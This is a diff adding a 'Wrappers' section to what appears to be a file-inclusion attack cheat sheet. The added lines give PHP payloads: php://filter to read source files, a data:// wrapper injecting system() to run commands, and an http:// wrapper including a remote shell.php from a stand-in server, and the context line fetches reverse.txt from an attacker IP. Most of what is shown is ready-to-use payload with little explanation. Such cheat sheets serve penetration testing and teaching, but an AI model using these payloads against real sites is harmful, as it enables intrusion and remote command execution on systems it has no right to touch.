@@ -66,7 +66,34 @@ https:\\VICTIMurlADDRESS/PATH/PATH/page=hTTP://<attackerip>/reverse.txt
 # Other bypassing techniques for slashes
 ```
 
+## Wrappers
 
+### PHP wrapper
+
+php://filter : allow the attacker to include local file and base64 encode as the output:
+
+```
+http://IPdomain/rfi.php?language=php://filter/convert.base64-encode/resource=recurso.php
+```
+
+PHP filter without base64 encode:
+
+```
+php://filter/resource=flag.txt
+```
+
+
+### DATA wrapper
+
+```
+http://IPdomain/rfi.php?language=data://text/plain,<?php system('$_GET("cmd")');?>&cmd=whoami
+```
+
+### HTTP wrapper
+
+```
+http://IPdomain/rfi.php?language=http://SERVERIP/shell.php
+```
 
 ## Mitigation
 
